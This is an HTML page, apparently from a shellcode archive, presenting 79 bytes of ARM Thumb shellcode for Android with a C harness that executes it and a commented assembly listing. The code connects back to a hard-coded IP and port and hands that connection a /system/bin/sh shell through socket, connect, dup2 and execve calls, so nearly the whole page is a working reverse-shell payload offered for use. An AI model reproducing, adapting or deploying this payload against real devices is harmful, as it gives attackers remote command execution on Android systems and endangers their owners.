<html><head><title>Linux/ARM - connect back /bin/sh. 79 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* This ARM Thumb sc connects to a given IP and port with a shell.
 * Intended for use with Android (hence /system/bin/sh).
 *
 * Connects to the provided IP and port with a shell
 *
 * no null bytes in the code, but does this really matter these days?
 * it could be fixed with just a few instructions.
 *
 * Released to the public domain */

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#define SWAP16(x)	((x) &lt;&lt; 8 | ((x) &gt;&gt; 8))

const unsigned char sc[] = {
	/* Enter Thumb mode (for proof of concept) */
	0x01, 0x10, 0x8F, 0xE2, 0x11, 0xFF, 0x2F, 0xE1,

	/* 16-bit instructions follow */
	0x02, 0x20, 0x01, 0x21, 0x92, 0x1A, 0x0F, 0x02, 0x19, 0x37, 0x01,
	0xDF, 0x06, 0x1C, 0x08, 0xA1, 0x10, 0x22, 0x02, 0x37, 0x01, 0xDF,
	0x3F, 0x27, 0x02, 0x21, 0x30, 0x1c, 0x01, 0xdf, 0x01, 0x39, 0xFB,
	0xD5, 0x05, 0xA0, 0x92, 0x1a, 0x05, 0xb4, 0x69, 0x46, 0x0b, 0x27,
	0x01, 0xDF, 0xC0, 0x46,

	/* struct sockaddr */
	0x02, 0x00,
	/* port: 0x1234 */
	0x12, 0x34,
	/* ip: 10.0.2.2 */
	0x0A, 0x00, 0x02, 0x02,

	/* &quot;/system/bin/sh&quot; */
	0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e,
	0x2f, 0x73, 0x68, 0x00
};

int main()
{
	printf(&quot;shellcode=%d bytes\n&quot;
	       &quot;connecting to %d.%d.%d.%d:%hd\n&quot;, sizeof sc,
		sc[0x3c], sc[0x3d], sc[0x3e], sc[0x3f],
		SWAP16(*((unsigned short *)(sc+0x3a))));
	return ((int (*)(void))sc)();
}

/*
 * Assembly for those who are interested 
 *

# switch to Thumb mode (16-bit ops) 
        .code 32
        add     r1, pc, #1
        bx      r1

# Thumb instructions follow
        .code 16

# socket(2, 1, 0)
        mov     r0, #2
        mov     r1, #1
        sub     r2, r2, r2
        lsl     r7, r1, #8
        add     r7, r7, #25
        svc     1

# connect(r0, &amp;addr, 16)
        mov     r6, r0
        add     r1, pc, #32
        mov     r2, #16
        add     r7, #2
        svc     1

# dup2(r0, 0/1/2)
        mov     r7, #63
        mov     r1, #2
Lb:
        mov     r0, r6
        svc     1
        sub     r1, #1
        bpl     Lb

# execve(&quot;/system/bin/sh&quot;, [&quot;/system/bin/sh&quot;, 0], 0) 
        add     r0, pc, #20
        sub     r2, r2, r2
        push    {r0, r2}
        mov     r1, sp
        mov     r7, #11
        svc     1

# struct sockaddr 
.align 2
.short 0x2
.short 0x3412	# port	
.byte 10,0,2,2	# IP
.ascii &quot;/system/bin/sh\0\0&quot;	# shell

***/

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
